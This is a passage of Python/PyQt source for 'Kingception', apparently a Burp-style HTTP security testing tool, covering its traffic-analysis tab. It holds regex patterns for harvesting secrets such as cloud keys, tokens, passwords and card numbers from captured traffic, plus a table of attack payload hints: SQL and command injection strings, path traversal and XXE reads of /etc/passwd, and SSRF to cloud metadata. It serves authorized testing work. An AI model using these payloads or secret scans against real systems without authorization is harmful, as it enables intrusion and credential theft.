            self._on_msg(m)   # repopulates Traffic always, and Logger too if it's already been opened
        if prev_intercept_on:
            self.ic_btn.setChecked(True)
        self._refresh_host_list()

        if saved_rep_tabs and hasattr(self, 'rep_tabs'):
            while self.rep_tabs.count():
                self.rep_tabs.removeTab(0)
            for entry in saved_rep_tabs:
                self._add_rep_tab(title=entry["title"], raw_request=entry["raw"], url=entry["url"])
            if 0 <= prev_rep_index < self.rep_tabs.count():
                self.rep_tabs.setCurrentIndex(prev_rep_index)

        if dec_state and hasattr(self, 'dec_in'):
            in_txt, dtype, out_txt = dec_state
            self.dec_in.setPlainText(in_txt)
            self.dec_type.setCurrentText(dtype)
            self.dec_out.setPlainText(out_txt)

        if intr_state and hasattr(self, 'intr_url'):
            mode, method, url, hdrs, body = intr_state
            self.intr_mode.setCurrentText(mode)
            self.intr_method.setCurrentText(method)
            self.intr_url.setText(url)
            self.intr_headers.setPlainText(hdrs)
            self.intr_body.setPlainText(body)

        if scan_state and hasattr(self, 'scan_url'):
            url, mode, findings = scan_state
            self.scan_url.setText(url)
            self.scan_mode.setCurrentText(mode)
            for finding in findings:
                self._scan_finding(finding)   # re-appends to the fresh list AND redraws the row

        if 0 <= prev_tab_index < self.tabs.count():
            self.tabs.setCurrentIndex(prev_tab_index)

    def _show_about_dialog(self):
        dlg = QDialog(self)
        dlg.setWindowTitle("About Kingception")
        dlg.setFixedWidth(360)
        dlg.setStyleSheet(f"background:{T.BG};color:{T.TXT1};")
        v = QVBoxLayout(dlg)
        v.setContentsMargins(24, 24, 24, 24)
        v.setSpacing(10)

        logo_lbl = QLabel()
        logo_lbl.setPixmap(_draw_logo_pixmap(96))
        logo_lbl.setFixedSize(96, 96)
        logo_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        v.addWidget(logo_lbl, alignment=Qt.AlignmentFlag.AlignCenter)

        title = QLabel("Kingception")
        title.setStyleSheet(f"color:{T.TXT1};font-size:18px;font-weight:700;")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        v.addWidget(title)

        ver = QLabel("v1.0 — Professional HTTP Security Suite")
        ver.setStyleSheet(f"color:{T.TXT2};font-size:12px;")
        ver.setAlignment(Qt.AlignmentFlag.AlignCenter)
        v.addWidget(ver)

        desc = QLabel(
            "A Burp-style intercepting proxy, repeater, intruder, scanner,\n"
            "collaborator and extension platform — built for authorized\n"
            "security testing only.")
        desc.setWordWrap(True)
        desc.setStyleSheet(f"color:{T.TXT3};font-size:11px;padding-top:8px;")
        desc.setAlignment(Qt.AlignmentFlag.AlignCenter)
        v.addWidget(desc)

        close_btn = self._btn("Close", "primary", h=30)
        close_btn.clicked.connect(dlg.accept)
        v.addWidget(close_btn)
        dlg.exec()

    def _load_settings(self):
        """Load persisted settings: window geometry, intercept state, scope.
        (Theme is loaded separately by _load_theme_pref(), which must run
        BEFORE _build_ui() — see __init__.)"""
        s = self.settings
        # Window geometry
        geo = s.value("window/geometry")
        if geo:
            try:
                self.restoreGeometry(geo)
            except Exception:
                pass
        # Intercept toggle state
        intercept_on = s.value("intercept/enabled", False)
        intercept_on = intercept_on if isinstance(intercept_on, bool) else (str(intercept_on).lower() == "true")
        if intercept_on:
            QTimer.singleShot(200, lambda: self.ic_btn.setChecked(True))
        # Scope text
        scope = s.value("scope/text", "")
        if scope and hasattr(self, "scope_edit"):
            self.scope_edit.setPlainText(scope)
            self._save_scope()

    def _save_settings(self):
        """Persist settings to QSettings on quit."""
        s = self.settings
        s.setValue("window/geometry", self.saveGeometry())
        s.setValue("ui/dark_mode", _DARK_MODE)
        s.setValue("intercept/enabled", self.intercept.enabled)
        if hasattr(self, "scope_edit"):
            s.setValue("scope/text", self.scope_edit.toPlainText())
        s.sync()

    def _analysis_tab(self):
        """Attack Surface Mapper + Traffic Intel."""
        import urllib.parse as _up
        w = QWidget()
        root = QVBoxLayout(w); root.setContentsMargins(0,0,0,0); root.setSpacing(0)

        # ── Control bar ──────────────────────────────────────────────────────
        ctl = QWidget(); ctl.setFixedHeight(44)
        ctl.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        cl = QHBoxLayout(ctl); cl.setContentsMargins(10,0,10,0); cl.setSpacing(6)
        cl.addWidget(QLabel("Host filter:"))
        self.an_target = QLineEdit()
        self.an_target.setPlaceholderText("Leave blank to analyse ALL captured traffic  |  e.g.  target.com")
        self.an_target.setFixedHeight(28)
        self.an_host_combo = QComboBox()
        self.an_host_combo.setFixedHeight(28); self.an_host_combo.setMinimumWidth(180)
        self.an_host_combo.setToolTip("Quick-select from captured hosts")
        an_run = self._btn("⚡ Analyse",       "primary", h=28)
        an_clr = self._btn("🗑 Clear",          h=28)
        an_exp = self._btn("📄 Export HTML",    h=28)
        an_exp_txt = self._btn("📋 Export Text", h=28)
        self.an_prog = QProgressBar(); self.an_prog.setFixedHeight(4)
        self.an_prog.setTextVisible(False); self.an_prog.setValue(0)
        self.an_prog.setStyleSheet(
            f"QProgressBar{{background:{T.SURFACE};border:none;}}"
            f"QProgressBar::chunk{{background:{T.BLUE};}}")
        self.an_status = QLabel("Ready — browse via proxy, then click Analyse")
        self.an_status.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-family:{T.MONO};")
        cl.addWidget(self.an_target, 1)
        cl.addWidget(self.an_host_combo)
        cl.addWidget(an_run); cl.addWidget(an_clr)
        cl.addWidget(an_exp); cl.addWidget(an_exp_txt)
        cl.addSpacing(12); cl.addWidget(self.an_status)
        root.addWidget(ctl)
        root.addWidget(self.an_prog)

        # ── Result tabs ──────────────────────────────────────────────────────
        tabs = QTabWidget()
        tabs.setStyleSheet(
            f"QTabWidget::pane{{border:none;background:{T.BG};}}"
            f"QTabBar::tab{{padding:6px 18px;font-size:12px;background:{T.PANEL};"
            f"color:{T.TXT3};border-bottom:2px solid transparent;}}"
            f"QTabBar::tab:selected{{color:{T.BLUE};border-bottom:2px solid {T.BLUE};}}"
            f"QTabBar::tab:hover:!selected{{background:{T.SURFACE};}}")
        root.addWidget(tabs, 1)

        def _tree(cols):
            t = QTreeWidget(); t.setHeaderLabels(cols)
            t.setAlternatingRowColors(True); t.setRootIsDecorated(False)
            t.setSortingEnabled(True)
            t.header().setSectionResizeMode(t.header().ResizeMode.Interactive)
            t.setStyleSheet(
                f"QTreeWidget{{background:{T.PANEL};border:none;"
                f"alternate-background-color:{T.SURFACE};}}"
                f"QTreeWidget::item{{padding:4px 8px;}}")
            return t

        def _rtext():
            e = QPlainTextEdit(); e.setReadOnly(True); e.setFont(mono_font(10))
            e.setStyleSheet(
                f"background:{T.BG};color:{T.CODE};border:none;"
                f"padding:10px;font-family:{T.MONO};")
            return e

        self.an_tech    = _tree(["Technology","Version","Evidence","Category"])
        self.an_ep      = _tree(["Method","Endpoint","Status","Auth","Content-Type","Size","Notes"])
        self.an_params  = _tree(["Parameter","Location","Type","Example Value","Endpoint","Risk Hint"])
        self.an_secrets = _tree(["Type","Value (masked)","Found In","Risk","URL"])
        self.an_auth    = _tree(["Mechanism","Detail","Endpoint","Strength","Issues"])
        self.an_attack  = _tree(["Priority","Test Case","Target","Payload Hint","CWE","Notes"])
        self.an_cookies = _tree(["Name","Value (masked)","Domain","Flags","Issues"])
        self.an_report  = _rtext()

        tabs.addTab(self.an_tech,    "🖥 Tech Stack")
        tabs.addTab(self.an_ep,      "🔗 Endpoints")
        tabs.addTab(self.an_params,  "🎯 Parameters")
        tabs.addTab(self.an_secrets, "🔑 Secrets")
        tabs.addTab(self.an_auth,    "🛡 Auth")
        tabs.addTab(self.an_cookies, "🍪 Cookies")
        tabs.addTab(self.an_attack,  "⚔ Attack Surface")
        tabs.addTab(self.an_report,  "📄 Report")

        # Right-click on Endpoints → Send to Repeater / Intruder / Scanner
        self.an_ep.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        def _ep_ctx(pos):
            item = self.an_ep.itemAt(pos)
            if not item: return
            menu = QMenu()
            a_rep  = menu.addAction("🔁 Send to Repeater")
            a_int  = menu.addAction("💣 Send to Intruder")
            a_scan = menu.addAction("🔍 Send to Scanner")
            a_copy = menu.addAction("📋 Copy URL")
            act = menu.exec(self.an_ep.viewport().mapToGlobal(pos))
            ep  = item.data(0, Qt.ItemDataRole.UserRole) or {}
            if act == a_rep:
                self._send_to_rep(ep)
            elif act == a_int:
                self._send_to_int(ep)
            elif act == a_scan:
                if hasattr(self, 'scan_url'):
                    self.scan_url.setText(ep.get("url",""))
                    self.tabs.setCurrentIndex(4)
            elif act == a_copy:
                QApplication.clipboard().setText(ep.get("url",""))
        self.an_ep.customContextMenuRequested.connect(_ep_ctx)

        # Right-click on Secrets → Copy masked / Copy raw / Open URL
        self.an_secrets.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        def _sec_ctx(pos):
            item = self.an_secrets.itemAt(pos)
            if not item: return
            menu = QMenu()
            a_copy = menu.addAction("📋 Copy Masked Value")
            act = menu.exec(self.an_secrets.viewport().mapToGlobal(pos))
            if act == a_copy:
                QApplication.clipboard().setText(item.text(1))
        self.an_secrets.customContextMenuRequested.connect(_sec_ctx)

        # ── Signature tables ─────────────────────────────────────────────────
        TECH_SIGS = [
            # (response_header, tech_name, regex_pattern, category)
            ('Server',           'Apache',        r'Apache(?:/[\d.]+)?',          'Web Server'),
            ('Server',           'Nginx',         r'nginx(?:/[\d.]+)?',           'Web Server'),
            ('Server',           'IIS',           r'Microsoft-IIS(?:/[\d.]+)?',   'Web Server'),
            ('Server',           'LiteSpeed',     r'LiteSpeed',                   'Web Server'),
            ('Server',           'Caddy',         r'Caddy(?:/[\d.]+)?',           'Web Server'),
            ('Server',           'gunicorn',      r'gunicorn(?:/[\d.]+)?',        'App Server'),
            ('Server',           'Werkzeug',      r'Werkzeug(?:/[\d.]+)?',        'App Server'),
            ('X-Powered-By',     'PHP',           r'PHP(?:/[\d.]+)?',             'Language'),
            ('X-Powered-By',     'ASP.NET',       r'ASP\.NET(?:/[\d.]+)?',        'Language'),
            ('X-Powered-By',     'Express',       r'Express',                     'Framework'),
            ('X-Powered-By',     'Next.js',       r'Next\.js',                    'Framework'),
            ('X-Generator',      'WordPress',     r'WordPress(?:/[\d.]+)?',       'CMS'),
            ('X-Generator',      'Drupal',        r'Drupal(?:\s[\d.]+)?',         'CMS'),
            ('X-Drupal-Cache',   'Drupal',        r'.*',                          'CMS'),
            ('Set-Cookie',       'PHP Session',   r'PHPSESSID',                   'Language'),
            ('Set-Cookie',       'Java Session',  r'JSESSIONID',                  'Language'),
            ('Set-Cookie',       'ASP.NET',       r'ASP\.NET_SessionId',          'Language'),
            ('Set-Cookie',       'Django',        r'csrftoken|sessionid',         'Framework'),
            ('Set-Cookie',       'Rails',         r'_session_id|_csrf_token',     'Framework'),
            ('Set-Cookie',       'Laravel',       r'XSRF-TOKEN|laravel_session',  'Framework'),
            ('CF-Ray',           'Cloudflare',    r'.*',                          'CDN'),
            ('X-Vercel-Id',      'Vercel',        r'.*',                          'Hosting'),
            ('X-Amzn-Trace-Id', 'AWS',           r'.*',                          'Cloud'),
            ('X-Azure-Ref',      'Azure',         r'.*',                          'Cloud'),
            ('X-GUploader',      'GCP',           r'.*',                          'Cloud'),
            ('Via',              'Varnish',       r'varnish',                     'Cache'),
            ('X-Varnish',        'Varnish',       r'.*',                          'Cache'),
            ('X-Fastly-Request-ID','Fastly',      r'.*',                          'CDN'),
            ('X-Shopify-Stage',  'Shopify',       r'.*',                          'E-Commerce'),
            ('X-Wix-Request-Id', 'Wix',           r'.*',                          'Hosting'),
        ]
        SECRET_PATS = [
            ('AWS Access Key',   r'AKIA[0-9A-Z]{16}'),
            ('AWS Secret Key',   r'(?i)aws.{0,20}secret.{0,20}["\']?([A-Za-z0-9/+]{40})["\']?'),
            ('Private Key',      r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----'),
            ('GitHub Token',     r'ghp_[A-Za-z0-9]{36}|ghs_[A-Za-z0-9]{36}'),
            ('Google API Key',   r'AIza[0-9A-Za-z\-_]{35}'),
            ('Stripe Key',       r'sk_live_[0-9a-zA-Z]{24,}|pk_live_[0-9a-zA-Z]{24,}'),
            ('SendGrid Key',     r'SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}'),
            ('JWT Token',        r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'),
            ('Bearer Token',     r'Bearer\s+([A-Za-z0-9\-._~+/]+=*)'),
            ('API Key (generic)',r'(?i)(api[_-]?key|apikey|api_token|access_token)\s*[:=]\s*["\']?([A-Za-z0-9_\-]{20,})["\']?'),
            ('Password',         r'(?i)(password|passwd|pwd|secret)\s*[:=]\s*["\']?([^"\'\s&<>{]{4,})["\']?'),
            ('Email Address',    r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}'),
            ('Credit Card',      r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b'),
            ('Phone Number',     r'\b(\+?1?\s*[-.]?\s*\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4})\b'),
        ]
        ATTACK_TESTS = [
            ('Critical','SQL Injection',          'All DB parameters',        "'  OR '1'='1",          'CWE-89',  'Try error-based, time-based, OOB'),
            ('Critical','Command Injection',      'OS-facing parameters',     '`id`;$(whoami)',         'CWE-78',  'Sleep-based blind; ; | backtick'),
            ('Critical','SSTI',                   'Template parameters',      '{{7*7}} ${7*7} #{7*7}', 'CWE-94',  'Jinja2/Twig/FreeMarker/Pebble'),
            ('Critical','Deserialization',        'Serialized object params', 'ysoserial payload',     'CWE-502', 'Java/PHP/Python pickle'),
            ('High','Reflected XSS',              'String inputs/params',     '<script>alert(1)</script>','CWE-79','Check CSP; also DOM XSS'),
            ('High','Path Traversal / LFI',       'File/path parameters',     '../../../etc/passwd',   'CWE-22',  'Also try URL-encoded variants'),
            ('High','SSRF',                       'URL / host parameters',    'http://169.254.169.254/','CWE-918','Cloud metadata; gopher://'),
            ('High','IDOR',                       'ID / UUID parameters',     'Fuzz ±1, swap UUID',    'CWE-639', 'Horizontal & vertical priv-esc'),
            ('High','XXE',                        'XML request bodies',       '<!ENTITY x SYSTEM "file:///etc/passwd">','CWE-611','Also blind XXE via DNS'),
            ('High','JWT Weaknesses',             'JWT-authenticated endpoints','alg=none; weak secret','CWE-347','Brute secret; algorithm confusion'),
            ('Medium','CSRF',                     'State-changing POST/PUT',  'Replay without CSRF token','CWE-352','Check SameSite + CSRF header'),
            ('Medium','Open Redirect',            'redirect/next/url params', '//evil.com',            'CWE-601', 'Also //evil%2ecom variants'),
            ('Medium','Mass Assignment',          'JSON body params',         'Add privilege fields',  'CWE-915', 'admin=true; role=superuser'),
            ('Medium','Race Condition',           'Coupon/credit endpoints',  'Parallel requests (50)','CWE-362', 'Limit/pricing bypass'),
            ('Low','Clickjacking',                'Pages without X-Frame-Options','<iframe>',          'CWE-1021','Check frame-ancestors CSP too'),
            ('Low','Information Disclosure',      'Error handling endpoints', 'Malformed/oversized input','CWE-209','Stack traces; debug info'),
            ('Low','HTTP Method Tampering',       'All endpoints',            'PUT/DELETE/TRACE/CONNECT','CWE-650','Check all verbs per endpoint'),
        ]

        def _refresh_host_combo():
            """Populate the host quick-select from captured traffic."""
            hosts = sorted(set(m.get("host","") for m in self.db.recent if m.get("host","")))
            self.an_host_combo.blockSignals(True)
            self.an_host_combo.clear()
            self.an_host_combo.addItem("(all hosts)")
            for h in hosts:
                self.an_host_combo.addItem(h)
            self.an_host_combo.blockSignals(False)

        def _run():
            _refresh_host_combo()
            url_filter = self.an_target.text().strip()
            if not url_filter and self.an_host_combo.currentIndex() > 0:
                url_filter = self.an_host_combo.currentText()

            msgs = list(self.db.recent)
            if url_filter:
                host_filter = url_filter.replace("https://","").replace("http://","").split("/")[0]
                msgs = [m for m in msgs if host_filter in m.get("url","")]
            if not msgs:
                self.an_status.setText("No traffic captured. Browse via proxy first.")
                return

            for t2 in [self.an_tech,self.an_ep,self.an_params,
                       self.an_secrets,self.an_auth,self.an_cookies,self.an_attack]:
                t2.clear()
            self.an_report.clear()
            self.an_prog.setValue(5); self.an_status.setText(f"Analysing {len(msgs)} messages…")
            QApplication.processEvents()

            def _worker():
                r = {'tech':[],'eps':[],'params':[],'secrets':[],
                     'auth':[],'attack':[],'cookies':[]}
                seen_tech=set(); seen_ep=set(); seen_par=set(); seen_sec=set()
                for m in msgs:
                    url2 = m.get('url',''); meth = m.get('method','GET')
                    rh  = m.get('req_headers')  or {}
                    rsh = m.get('resp_headers') or {}
                    rb  = decode_body(m.get('req_body'))  or ''
                    rsb = decode_body(m.get('resp_body')) or ''
                    st  = m.get('status',0)
                    ct  = rsh.get('Content-Type', rsh.get('content-type',''))
                    sz  = m.get('resp_size',0)
                    parsed = _up.urlparse(url2)
                    ep_key = f"{meth}:{parsed.path}"

                    # ── Tech fingerprint ────────────────────────────────────
                    for hdr,name,pat,cat in TECH_SIGS:
                        val = rsh.get(hdr, rh.get(hdr,''))
                        if not val: continue
                        mo = re.search(pat, val, re.I)
                        if mo and name not in seen_tech:
                            seen_tech.add(name)
                            r['tech'].append([name, mo.group(0)[:35],
                                              f"{hdr}: {val[:55]}", cat])

                    # ── Endpoints ────────────────────────────────────────────
                    if ep_key not in seen_ep:
                        seen_ep.add(ep_key)
                        auth_h = rh.get('Authorization', rh.get('authorization',''))
                        has_key = any(k.lower() in ('x-api-key','x-auth-token','api-key')
                                      for k in rh)
                        auth_req = 'JWT' if 'bearer' in auth_h.lower() else \
                                   'Basic' if 'basic' in auth_h.lower() else \
                                   'API-Key' if has_key else 'No'
                        notes = []
                        if any(x in parsed.path.lower()
                               for x in ['admin','superuser','root','manage','/debug','internal']):
                            notes.append('⚠ privileged')
                        if any(x in parsed.path.lower() for x in ['/api/','/v1/','/v2/','/v3/','/graphql','/rest/']):
                            notes.append('API')
                        if parsed.query: notes.append('has params')
                        if meth in ('POST','PUT','PATCH','DELETE'): notes.append('state-change')
                        ep_data = {'method':meth,'url':url2,'path':parsed.path,
                                   'host':m.get('host',''),'status':st,'req_headers':rh}
                        row_ep  = [meth, parsed.path[:90], str(st), auth_req,
                                   ct[:35], pretty_size(sz), ', '.join(notes)]
                        r['eps'].append((row_ep, ep_data))

                    # ── Parameters ──────────────────────────────────────────
                    for k, v in _up.parse_qsl(parsed.query):
                        pk = f"q:{k}"
                        if pk not in seen_par:
                            seen_par.add(pk)
                            t = 'integer' if v.isdigit() else 'boolean' if v.lower() in ('true','false') \
                                else 'uuid' if re.match(r'[0-9a-f-]{36}',v,re.I) else 'string'
                            risk = 'High — try SQLi/XSS' if t in ('integer','string') else 'Medium'
                            r['params'].append([k,'Query',t,v[:30],parsed.path[:40],risk])
                    if rb:
                        ct_req = rh.get('Content-Type',rh.get('content-type',''))
                        if 'json' in ct_req.lower():
                            try:
                                jb = json.loads(rb)
                                if isinstance(jb, dict):
                                    for k, v2 in jb.items():
                                        pk = f"j:{k}"
                                        if pk not in seen_par:
                                            seen_par.add(pk)
                                            t = type(v2).__name__
                                            risk = 'High — try injection' if t == 'str' else 'Medium'
                                            r['params'].append([k,'JSON Body',t,str(v2)[:30],
                                                                parsed.path[:40],risk])
                            except Exception: pass
                        elif 'x-www-form' in ct_req.lower():
                            for k, v in _up.parse_qsl(rb):
                                pk = f"f:{k}"
                                if pk not in seen_par:
                                    seen_par.add(pk)
                                    r['params'].append([k,'Form Body','string',v[:30],
                                                        parsed.path[:40],'High — try SQLi/XSS'])

                    # ── Secrets scan ─────────────────────────────────────────
                    scan_txt = rb + rsb + str(rh) + str(rsh)
                    for stype, pat in SECRET_PATS:
                        for mo in re.finditer(pat, scan_txt):
                            raw_val = mo.group(0)
                            sk = f"{stype}:{raw_val[:20]}"
                            if sk in seen_sec: continue
                            seen_sec.add(sk)
                            masked = raw_val[:4] + '***' + raw_val[-4:] if len(raw_val) > 8 else '***'
                            loc  = 'Response' if raw_val in (rsb + str(rsh)) else 'Request'
                            risk = ('Critical' if stype in
                                    ('AWS Access Key','AWS Secret Key','Private Key',
                                     'GitHub Token','Stripe Key','Credit Card')
                                    else 'High' if stype in
                                    ('Bearer Token','API Key (generic)','JWT Token',
                                     'Google API Key','SendGrid Key')
                                    else 'Medium')
                            r['secrets'].append([stype, masked, loc, risk, url2[:60]])

                    # ── Auth ─────────────────────────────────────────────────
                    auth_h = rh.get('Authorization', rh.get('authorization',''))
                    if auth_h:
                        if 'bearer' in auth_h.lower():
                            tok = auth_h.split(' ',1)[-1]
                            is_jwt = tok.count('.') == 2 and tok.startswith('eyJ')
                            issues = 'Check alg:none; verify signature' if is_jwt else ''
                            r['auth'].append(['Bearer Token', tok[:40]+'…',
                                              parsed.path[:45], 'JWT' if is_jwt else 'Opaque', issues])
                        elif 'basic' in auth_h.lower():
                            r['auth'].append(['HTTP Basic','(credentials encoded)',
                                              parsed.path[:45],'Weak',
                                              'Credentials in every request; use Bearer instead'])
                        elif 'digest' in auth_h.lower():
                            r['auth'].append(['HTTP Digest','(hashed)',parsed.path[:45],'Medium',
                                              'Susceptible to MITM if not over TLS'])
                    for api_hdr in ('X-Api-Key','X-Auth-Token','X-Access-Token','Api-Key'):
                        if rh.get(api_hdr):
                            r['auth'].append([api_hdr, rh[api_hdr][:35]+'…',
                                              parsed.path[:45],'API Key',
                                              'Ensure key rotated; check for exposure in logs/errors'])

                    # ── Cookies ──────────────────────────────────────────────
                    sc = rsh.get('Set-Cookie','')
                    if sc:
                        for cookie in sc.split(','):
                            parts2 = cookie.strip().split(';')
                            if not parts2: continue
                            name_val = parts2[0].strip()
                            name  = name_val.split('=',1)[0].strip()
                            val2  = name_val.split('=',1)[1].strip() if '=' in name_val else ''
                            flags = [p.strip().lower() for p in parts2[1:]]
                            issues = []
                            if 'httponly' not in flags: issues.append('Missing HttpOnly')
                            if 'secure'   not in flags: issues.append('Missing Secure')
                            samesite = next((f for f in flags if 'samesite' in f), None)
                            if not samesite:             issues.append('Missing SameSite')
                            elif 'none' in samesite:     issues.append('SameSite=None — CSRF risk')
                            masked_v = val2[:4]+'***' if len(val2)>6 else val2
                            domain = next((f.split('=',1)[1] for f in flags if f.startswith('domain=')),
                                          m.get('host',''))
                            r['cookies'].append([name, masked_v, domain,
                                                 ', '.join(p.split('=')[0] for p in flags),
                                                 '; '.join(issues) if issues else '✅ OK'])

                # ── Attack surface ────────────────────────────────────────
                r['attack'] = [[p,t2,tgt,hint,cwe,note]
                               for p,t2,tgt,hint,cwe,note in ATTACK_TESTS]
                return r

            def _done(res):
                self.an_prog.setValue(100)
                n_crit = sum(1 for s in res['secrets'] if s[3]=='Critical')
                self.an_status.setText(
                    f"Done — {len(res['eps'])} endpoints · {len(res['params'])} params · "
                    f"{len(res['secrets'])} secrets ({n_crit} critical) · "
                    f"{len(res['auth'])} auth mechanisms · {len(res['cookies'])} cookies")

                mc = {'GET':T.GREEN,'POST':T.YELLOW,'PUT':T.BLUE,'DELETE':T.RED,
                      'PATCH':"#a855f7","HEAD":T.TXT3,"OPTIONS":T.TXT3}
                rc = {'Critical':"#ec4899",'High':T.RED,'Medium':T.YELLOW,'Low':T.TXT3}
                pc = {'Critical':"#ec4899",'High':T.RED,'Medium':T.YELLOW,'Low':T.TXT3}

                for row in res['tech']:
                    self.an_tech.addTopLevelItem(QTreeWidgetItem(row))

                for row_data, ep_data in res['eps']:
                    it = QTreeWidgetItem(row_data)
                    it.setData(0, Qt.ItemDataRole.UserRole, ep_data)
                    it.setForeground(0, QBrush(QColor(mc.get(row_data[0], T.TXT2))))
                    # Colour status
                    st2 = int(row_data[2]) if row_data[2].isdigit() else 0
                    it.setForeground(2, QBrush(QColor(status_color(st2))))
                    if '⚠' in row_data[6]:
                        it.setForeground(6, QBrush(QColor(T.RED)))
                    self.an_ep.addTopLevelItem(it)

                for row in res['params']:
                    it = QTreeWidgetItem(row)
                    if 'High' in row[5]: it.setForeground(5, QBrush(QColor(T.YELLOW)))
                    self.an_params.addTopLevelItem(it)

                for row in res['secrets']:
                    it = QTreeWidgetItem(row)
                    it.setForeground(3, QBrush(QColor(rc.get(row[3], T.TXT2))))
                    self.an_secrets.addTopLevelItem(it)

                for row in res['auth']:
                    it = QTreeWidgetItem(row)
                    if row[4]: it.setForeground(4, QBrush(QColor(T.YELLOW)))
                    self.an_auth.addTopLevelItem(it)

                for row in res['cookies']:
                    it = QTreeWidgetItem(row)
                    if row[4] and row[4] != '✅ OK':
                        it.setForeground(4, QBrush(QColor(T.YELLOW)))
                    self.an_cookies.addTopLevelItem(it)

                for row in res['attack']:
                    it = QTreeWidgetItem(row)
                    it.setForeground(0, QBrush(QColor(pc.get(row[0], T.TXT2))))
                    self.an_attack.addTopLevelItem(it)

                # Text report
                lines2 = [
                    "╔══════════════════════════════════════════════════════════╗",
                    "║          Kingception Security Analysis Report            ║",
                    "╚══════════════════════════════════════════════════════════╝","",
                    f"  Date        : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}",
                    f"  Messages    : {len(list(self.db.recent))} captured",
                    f"  Endpoints   : {len(res['eps'])}",
                    f"  Parameters  : {len(res['params'])}",
                    f"  Secrets     : {len(res['secrets'])} ({n_crit} Critical)",
                    f"  Auth mechs  : {len(res['auth'])}",
                    f"  Tech stack  : {len(res['tech'])} detected",
                    f"  Cookies     : {len(res['cookies'])}","",
                    "── TECH STACK ──────────────────────────────────────────────"]
                for t2 in res['tech']:
                    lines2.append(f"  [{t2[3]:<12}] {t2[0]:<20} {t2[1]}")
                lines2 += ["","── SECRETS (CRITICAL FIRST) ───────────────────────────────"]
                for s in sorted(res['secrets'], key=lambda x:
                                {'Critical':0,'High':1,'Medium':2,'Low':3}.get(x[3],4)):
                    lines2.append(f"  [{s[3]:<8}] {s[0]:<22} {s[1]}  ({s[2]})")
                lines2 += ["","── COOKIES WITH ISSUES ────────────────────────────────────"]
                for ck in res['cookies']:
                    if ck[4] and ck[4] != '✅ OK':
                        lines2.append(f"  {ck[0]:<30} {ck[4]}")
                lines2 += ["","── ATTACK SURFACE ─────────────────────────────────────────"]
                for a in res['attack']:
                    lines2.append(f"  [{a[0]:<8}] {a[1]:<26} {a[4]}")
                self.an_report.setPlainText('\n'.join(lines2))
                self._log(f"[Analysis] {len(res['eps'])} endpoints · {len(res['secrets'])} secrets · "
                          f"{len(res['cookies'])} cookies")

            fut = self._thread_pool.submit(_worker)
            def _poll():
                if fut.done():
                    try: _done(fut.result())
                    except Exception as ex:
                        self.an_status.setText(f"Error: {ex}"); self.an_prog.setValue(0)
                else:
                    self.an_prog.setValue(min(self.an_prog.value()+2, 92))
                    QTimer.singleShot(200, _poll)
            QTimer.singleShot(200, _poll)

        def _export_html():
            path, _ = QFileDialog.getSaveFileName(
                self, "Export Analysis", "kingception_analysis.html", "HTML (*.html)")
            if not path:
                return
            import html as _html
            _m_col = {'GET':'#22c55e','POST':'#eab308','PUT':'#3b82f6','DELETE':'#ef4444'}
            _r_col = {'Critical':'#ec4899','High':'#ef4444','Medium':'#eab308'}

            def _ep_row(i):
                it   = self.an_ep.topLevelItem(i)
                col  = _m_col.get(it.text(0), "#94a3b8")
                return (f"<tr><td style='color:{col};font-weight:700'>{_html.escape(it.text(0))}</td>"
                        + "".join(f"<td>{_html.escape(it.text(c))}</td>" for c in range(1, 7)) + "</tr>")

            def _sec_row(i):
                it   = self.an_secrets.topLevelItem(i)
                col  = _r_col.get(it.text(3), "#94a3b8")
                return (f"<tr><td style='color:{col};font-weight:700'>{_html.escape(it.text(0))}</td>"
                        + "".join(f"<td>{_html.escape(it.text(c))}</td>" for c in range(1, 5)) + "</tr>")

            ep_rows  = "".join(_ep_row(i)  for i in range(self.an_ep.topLevelItemCount()))
            sec_rows = "".join(_sec_row(i) for i in range(self.an_secrets.topLevelItemCount()))
            html = f"""<!DOCTYPE html><html><head><meta charset='UTF-8'>
<title>Kingception Analysis</title>
<style>*{{box-sizing:border-box}}
body{{background:#07101d;color:#e2e8f0;font-family:Inter,sans-serif;font-size:13px;margin:0}}
.c{{max-width:1200px;margin:0 auto;padding:32px}}
h1{{color:#4d8ef7;margin-bottom:4px}}h2{{color:#4d8ef7;font-size:14px;margin:24px 0 8px}}
p.sub{{color:#64748b;margin:0 0 24px}}
table{{width:100%;border-collapse:collapse;background:#0f1d30;border:1px solid #1a2d4a;
       border-radius:7px;margin-bottom:24px;overflow:hidden}}
th{{background:#0b1523;color:#94a3b8;padding:8px 12px;text-align:left;font-size:11px;
    text-transform:uppercase;border-bottom:1px solid #1a2d4a}}
td{{padding:7px 12px;border-bottom:1px solid #0d1f33;font-size:12px}}
tr:last-child td{{border-bottom:none}}
</style></head><body><div class='c'>
<h1>⚡ Kingception Security Analysis Report</h1>
<p class='sub'>{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')} · {self.an_ep.topLevelItemCount()} endpoints · {self.an_secrets.topLevelItemCount()} secrets</p>
<h2>Endpoints</h2>
<table><thead><tr>{''.join(f'<th>{h}</th>' for h in ['Method','Endpoint','Status','Auth','Content-Type','Size','Notes'])}</tr></thead>
<tbody>{ep_rows}</tbody></table>
<h2>Secrets</h2>
<table><thead><tr>{''.join(f'<th>{h}</th>' for h in ['Type','Value','Location','Risk','URL'])}</tr></thead>
<tbody>{sec_rows}</tbody></table>
<h2>Full Text Report</h2>
<pre style='background:#0f1d30;padding:16px;border-radius:7px;font-size:11px;overflow-x:auto;white-space:pre-wrap'>{_html.escape(self.an_report.toPlainText())}</pre>
</div></body></html>"""
            open(path,'w',encoding='utf-8').write(html)
            webbrowser.open(f"file://{os.path.abspath(path)}")
            self._log(f"[Analysis] HTML report: {path}")

        def _export_text():
